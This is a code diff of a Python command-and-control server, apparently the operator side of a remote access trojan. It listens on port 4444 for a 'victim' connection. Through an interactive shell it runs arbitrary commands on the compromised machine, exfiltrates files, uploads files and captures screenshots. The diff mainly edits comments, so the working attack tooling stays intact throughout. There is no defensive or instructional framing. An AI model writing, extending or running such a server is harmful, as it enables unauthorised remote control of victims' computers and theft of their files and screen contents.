@@ -1,61 +1,48 @@
-# Import modules for networking, file management, and timing
 import socket
 import os
 import time
 
-# Server IP and Port configuration
-SERVER_IP = "0.0.0.0"  # Bind to all interfaces
+SERVER_IP = "0.0.0.0"
 SERVER_PORT = 4444
 BUFFER_SIZE = 1024
 
-# Directory setup for file transfers
-GRAB_DIR = "./grabbed/"      # Files received from victim
-SEND_DIR = "./to_send/"      # Files to be sent to victim
+GRAB_DIR = "./grabbed/"
+SEND_DIR = "./to_send/"
 os.makedirs(GRAB_DIR, exist_ok=True)
 os.makedirs(SEND_DIR, exist_ok=True)
 
-# ---------------------------------------------
-# Receive a file from the victim machine
-# ---------------------------------------------
+
 def receive_file(sock, victim_path):
     try:
-        clean_name = os.path.basename(victim_path.strip('"'))  # Normalize filename
+        clean_name = os.path.basename(victim_path.strip('"'))
         full_path = os.path.join(GRAB_DIR, clean_name)
         buffer = b""
-
         while True:
             data = sock.recv(BUFFER_SIZE)
             if not data:
                 print("[!] Connection lost during file receive.")
                 return
-
-            print(f"[DEBUG] Received chunk: {data[:50]}")  # Preview data
+            print(f"[DEBUG] Received chunk: {data[:50]}")  # show first 50 bytes
             buffer += data
-
             if b"__END__" in buffer:
                 parts = buffer.split(b"__END__", 1)
                 content = parts[0]
 
-                # Handle error flags or file-not-found from victim
                 if b"[!]" in content or b"File not found" in content:
                     print(f"[!] Victim reported error: {content.decode(errors='ignore')}")
                 else:
-                    # Auto-convert from UTF-16 if needed
+                    # Optionally remove UTF-16 BOM and convert
                     if content.startswith(b'\xff\xfe'):
                         print("[*] Detected UTF-16 BOM, converting to UTF-8")
                         content = content.decode('utf-16').encode('utf-8')
-
                     with open(full_path, 'wb') as f:
                         f.write(content)
                     print(f"[+] File received and saved to: {full_path}")
                 return
-
     except Exception as e:
         print(f"[!] Error receiving file: {e}")
 
-# ---------------------------------------------
-# Send a file to the victim machine
-# ---------------------------------------------
+
 def send_file(sock, command_arg):
     try:
         filename = os.path.basename(command_arg.strip('"'))
@@ -74,7 +61,7 @@ def send_file(sock, command_arg):
         with open(full_path, 'rb') as f:
             while chunk := f.read(BUFFER_SIZE):
                 sock.send(chunk)
-            sock.send(b"__END__")  # End of file signal
+            sock.send(b"__END__")
 
         print(f"[+] File sent: {full_path}")
 
@@ -85,19 +72,14 @@ def send_file(sock, command_arg):
         except:
             pass
 
-# ---------------------------------------------
-# Main server logic: Command and control shell
-# ---------------------------------------------
+
 def main():
-    # Setup listener socket
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     server.bind((SERVER_IP, SERVER_PORT))
     server.listen(1)
 
     print(f"[*] Listening on {SERVER_IP}:{SERVER_PORT} ...")
-
-    # Accept a client (victim) connection
     try:
         client, addr = server.accept()
         print(f"[+] Connection established from {addr}")
@@ -106,10 +88,10 @@ def main():
         server.close()
         return
 
-    # Interactive shell loop
     try:
         while True:
             command = input("Shell> ").strip()
+
             if not command:
                 continue
 
@@ -117,14 +99,12 @@ def main():
                 client.send(b"exit")
                 break
 
-            # Send a file request to victim and receive it
             if command.startswith("send_file "):
                 raw = command.split(" ", 1)[1].strip('"')
                 client.send(command.encode())
                 receive_file(client, raw)
                 continue
 
-            # Push a local file to victim
             elif command.startswith("receive_file "):
                 raw = command.split(" ", 1)[1].strip('"')
                 base = os.path.basename(raw)
@@ -137,8 +117,6 @@ def main():
 
                 client.send(command.encode())
                 send_file(client, base)
-
-                # Print result/acknowledgement from client
                 try:
                     response = client.recv(BUFFER_SIZE)
                     if not response:
@@ -150,20 +128,20 @@ def main():
                     break
                 continue
 
-            # Request screenshot from victim
             elif command == "screencap":
+
+                # Generate a unique filename based on timestamp
                 timestamp = time.strftime("%Y%m%d_%H%M%S")
                 filename = f"screenshot_{timestamp}.jpg"
+
                 client.send(command.encode())
                 receive_file(client, filename)
                 continue
 
-            # Grab arbitrary file from victim
+
             elif command.startswith("grab*"):
                 raw_path = command.split("*", 1)[1].strip('"')
                 base_name = os.path.basename(raw_path)
-
-                # Clear any pending data
                 try:
                     client.settimeout(0.2)
                     while True:
@@ -174,10 +152,8 @@ def main():
                     pass
                 finally:
                     client.settimeout(None)
-
                 client.send(command.encode())
-
-                # Receive file data with basic BOM detection
+                # Receive the file with error checking and BOM handling
                 try:
                     buffer = b""
                     while True:
@@ -191,6 +167,7 @@ def main():
                             if b"[!]" in content or b"File not found" in content:
                                 print(f"[!] Victim reported error: {content.decode(errors='ignore')}")
                             else:
+                                # 🧼 Clean UTF-8 BOM if present
                                 if content.startswith(b'\xef\xbb\xbf'):
                                     print("[*] Detected UTF-8 BOM, stripping")
                                     content = content[3:]
@@ -203,7 +180,7 @@ def main():
                     print(f"[!] Error during grab: {e}")
                 continue
 
-            # Fallback: execute shell command remotely
+            # Generic shell command
             try:
                 client.send(command.encode())
                 response = client.recv(BUFFER_SIZE)
@@ -217,8 +194,6 @@ def main():
 
     except KeyboardInterrupt:
         print("\n[!] Interrupted by user.")
-
-    # Clean shutdown
     finally:
         try:
             client.close()
@@ -227,6 +202,6 @@ def main():
         server.close()
         print("[*] Connection closed.")
 
-# Entry point
+
 if __name__ == "__main__":
     main()
